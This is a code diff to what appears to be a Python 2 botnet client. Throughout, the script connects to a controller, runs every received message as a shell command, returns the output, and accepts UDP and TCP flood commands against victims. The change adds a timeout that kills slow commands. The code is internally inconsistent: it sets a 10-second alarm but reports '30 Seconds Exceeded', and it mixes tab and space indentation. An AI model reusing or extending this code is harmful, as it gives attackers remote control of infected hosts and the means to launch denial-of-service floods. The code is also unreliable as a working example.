@@ -1,7 +1,6 @@
 #!/usr/bin/env python2
-#v2
 
-import subprocess, os, sys, time, threading
+import subprocess, os, sys, time, threading, signal
 from socket import *
 
 if (len(sys.argv) == 3):
@@ -9,6 +8,12 @@ if (len(sys.argv) == 3):
 	port = int(sys.argv[2])
 else:
 	sys.exit("Usage: client.py <server ip> <server port>")
+
+class Alarm(Exception):
+    pass
+
+def alarm_handler(signum, frame):
+    raise Alarm
 
 class udpFlood(threading.Thread):
     def __init__ (self, victimip, victimport):
@@ -81,18 +86,26 @@ def main():
 				msg=s.recv(10240)
 				if ((msg != "exit") and ("cd " not in msg) and ("udpflood " not in msg) and ("tcpflood " not in msg) and (msg != "hellows123") and ("udpfloodall " not in msg) and ("tcpfloodall " not in msg)):
 					comm = subprocess.Popen(str(msg), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-					STDOUT, STDERR = comm.communicate()
-					en_STDERR = bytearray(STDERR)
-					en_STDOUT = bytearray(STDOUT)
-					if (en_STDERR == ""):
-						if (en_STDOUT != ""):
-							print en_STDOUT
-							s.send(en_STDOUT)
+					signal.signal(signal.SIGALRM, alarm_handler)
+					signal.alarm(10)
+					try:
+    						STDOUT, STDERR = comm.communicate()
+						en_STDERR = bytearray(STDERR)
+						en_STDOUT = bytearray(STDOUT)
+						if (en_STDERR == ""):
+							if (en_STDOUT != ""):
+								print en_STDOUT
+								s.send(en_STDOUT)
+							else:
+								s.send("[CLIENT] Command Executed")
 						else:
-							s.send("[CLIENT] Command Executed")
-					else:
-						print en_STDERR
-						s.send(en_STDERR)
+							print en_STDERR
+							s.send(en_STDERR)
+					except Alarm:
+						comm.terminate()
+						comm.kill()
+    						s.send("[CLIENT] 30 Seconds Exceeded - SubProcess Killed\n")				
+					signal.alarm(0)
 				elif ("cd " in msg):
 					msg = msg.replace("cd ","")
 					os.chdir(msg)
